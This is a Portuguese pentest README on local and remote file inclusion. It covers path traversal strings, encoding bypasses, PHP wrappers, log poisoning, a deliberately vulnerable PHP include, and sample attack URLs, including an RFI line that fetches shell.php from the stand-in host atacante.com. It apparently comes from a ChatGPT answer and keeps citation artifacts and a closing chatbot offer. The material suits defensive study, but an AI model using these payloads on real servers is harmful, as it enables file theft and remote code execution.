# 🧪 LFI & RFI – Testes de Inclusão de Arquivos

## 📌 Tipos de Vulnerabilidades

### LFI (Local File Inclusion)

Permite que um atacante inclua arquivos do sistema local, como `/etc/passwd`, por meio de parâmetros de URL mal validados.
A vulnerabilidade de Local File Inclusion (LFI) surge da utilização insegura de parâmetros HTTP para controle de conteúdo em aplicações web, prática comum em linguagens como PHP, Node.js e Java. Frameworks frequentemente usam templates para incluir dinamicamente conteúdos com base em parâmetros da URL, como em chamadas do tipo /index.php?page=about. Quando esses parâmetros são passados diretamente para funções como include() sem validação, atacantes podem explorar essa falha para incluir arquivos locais sensíveis, como /etc/passwd ou arquivos de configuração. Essa exposição pode revelar código-fonte e credenciais, facilitando ataques mais graves como SQL Injection ou escalonamento de privilégios. Em ambientes mal configurados, LFI pode evoluir para execução remota de código, comprometendo completamente o servidor e possibilitando movimentação lateral e persistência.

### RFI (Remote File Inclusion)

Permite incluir e executar arquivos hospedados remotamente em servidores controlados pelo atacante, geralmente via URL como `http://attacker.com/shell.php` ([Invicti][3], [Imperva][4]).

---

## ⚙️ Técnicas Comuns de Exploração

### Traversal (Escalonamento de Diretórios)

Uso de seqüências como `../../../../etc/passwd` ou encoded/truncation variations (ex: `....//....//etc/passwd`) para escapar do diretório raiz&#x20;
.

### Codificações e Encodings

* **URL Encoding**: `..%2F..%2Fetc/passwd`
* **Double Encoding**: `..%252F..%252Fetc`
* **UTF‑8 truncation / meta:** `%c0%ae%c0%ae/etc/passwd` ([Exploit Notes][5], [HackTricks][6])

### Null Byte (%00)

Usado para truncar a extensão `.php` em aplicações vulneráveis (funciona em versões anteriores ao PHP 5.4) ([Exploit Notes][5], [Medium][7]).

### Wrappers PHP (e.g. `php://filter`, `php://input`)

* Extrair conteúdo de arquivos via base64 (`php://filter/read=convert.base64-encode/resource=index.php`)
* Execution via `php://input` para LFI → RCE .

### Log Poisoning / Inclusion de Arquivos de Log

Inserção de payloads via user-agent ou parâmetros em logs do servidor (`/proc/self/environ`) e posterior inclusão através de LFI ([Medium][7], [Wikipedia][1]).

### Upload de Arquivos Temporários

Se uma vulnerabilidade de upload permitir a criação de arquivos temporários previsíveis, um LFI pode explorá-los antes que sejam excluídos ([HackTricks][6]).

---

## 🛠 Ferramentas Utilizadas

* **Fimap**: ferramenta para identificar e explorar LFI / RFI automaticamente ([HackTricks][6]).
* Ferramentas de pentest como **Burp Suite**, **ZAP**, **Nessus**, e **Acunetix / Invicti**, capazes de detectar automaticamente pontos de inclusão de arquivos ([Number Analytics][8], [Invicti][2], [Invicti][3]).

---

## 🚫 Prevenção e Mitigações

### Validação de Entrada

* **Utilize whitelist** de arquivos permitidos ao invés de aceitar qualquer valor do usuário ([Medium][7], [Invicti][2], [Invicti][3]).
* Bloqueie ou filtre strings perigosas como `../`, `://` ou sequências codificadas.

### Configurações seguras de PHP

* **Desative `allow_url_include = Off`** (PHP ≥ 7.4 descontinuou essa funcionalidade) .
* **Desative `allow_url_fopen`**, se possível.

### Isolamento de Ambiente

Hospede as aplicações em ambientes isolados (como Docker) para limitar o impacto de possíveis inclusões arbitrárias ([Invicti][2]).

### Evitar Blacklists

Blacklists e filtros são insuficientes — atacantes podem contornar rapidamente com técnicas de encoding ou wrappers ([Invicti][2], [Medium][7]).

---

## 📋 Exemplos

### Vulnerável em PHP:

```php
<?php
$page = $_GET['page'];
include("pages/$page");
?>
```

Ataque típico LFI:

```
/script.php?page=../../../../etc/passwd
```

Ataque RFI (para servidores com `allow_url_include` ativado):

````
/script.php?page=http://atacante.com/shell.php
``` :contentReference[oaicite:14]{index=14}

---

## 🔎 Fluxo Típico de Teste

1. Identificar parâmetros passados para funções `include`, `require`, etc.
2. Testar traversal simples e encoded payloads.
3. Avaliar possibilidade de incluir arquivos de logs ou wrappers.
4. Testar RFI em ambientes PHP configurados com `allow_url_include`.
5. Automatizar com Fimap ou Burp Suite para descobertas escaláveis.
6. Validar configurações de whitelist ou desabilitar inclusões dinâmicas.

---

## ✅ Resumo

| Tipo    | Finalidade               | Risco principal                            |
|---------|---------------------------|--------------------------------------------|
| **LFI** | Inclusão de arquivos locais | Vazamento de dados ou escalation para RCE |
| **RFI** | Inclusão de arquivos remotos | Execução arbitrária de código no servidor  |

### Mitigação:
- Whitelist de valores permitidos
- Desativar features de include remoto
- Usar práticas sólidas de validação e codificação segura

---

## 🧠 Referências

- HackTricks: File Inclusion / Path traversal – técnicas e payloads para LFI/RFI :contentReference[oaicite:15]{index=15}  
- Invicti / Spanning / Imperva – definições, riscos e mitigação de LFI/RFI :contentReference[oaicite:16]{index=16}  
- Wikipedia e Exploit‑Notes – exemplos técnicos e encodings comuns :contentReference[oaicite:17]{index=17}

---

Se quiser que torne esse README mais detalhado (com payloadlists ou scripts), posso expandir!
::contentReference[oaicite:18]{index=18}
````

[1]: https://en.wikipedia.org/wiki/File_inclusion_vulnerability?utm_source=chatgpt.com "File inclusion vulnerability"
[2]: https://www.invicti.com/learn/local-file-inclusion-lfi/?utm_source=chatgpt.com "Local File Inclusion (LFI) - Invicti"
[3]: https://www.invicti.com/learn/remote-file-inclusion-rfi/?utm_source=chatgpt.com "Remote File Inclusion (RFI) - Invicti"
[4]: https://www.imperva.com/learn/application-security/rfi-remote-file-inclusion/?utm_source=chatgpt.com "What is RFI | Remote File Inclusion Example & Mitigation Methods"
[5]: https://exploit-notes.hdks.org/exploit/web/security-risk/file-inclusion/?utm_source=chatgpt.com "File Inclusion (LFI/RFI) - Exploit Notes"
[6]: https://hacktricks.boitatech.com.br/pentesting-web/file-inclusion?utm_source=chatgpt.com "File Inclusion/Path traversal - HackTricks - Boitatech"
[7]: https://medium.com/%40Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601?utm_source=chatgpt.com "Local File Inclusion (LFI) — Web Application Penetration Testing"
[8]: https://www.numberanalytics.com/blog/file-inclusion-exploitation-penetration-testing?utm_source=chatgpt.com "File Inclusion Exploitation: A Penetration Tester's Guide"
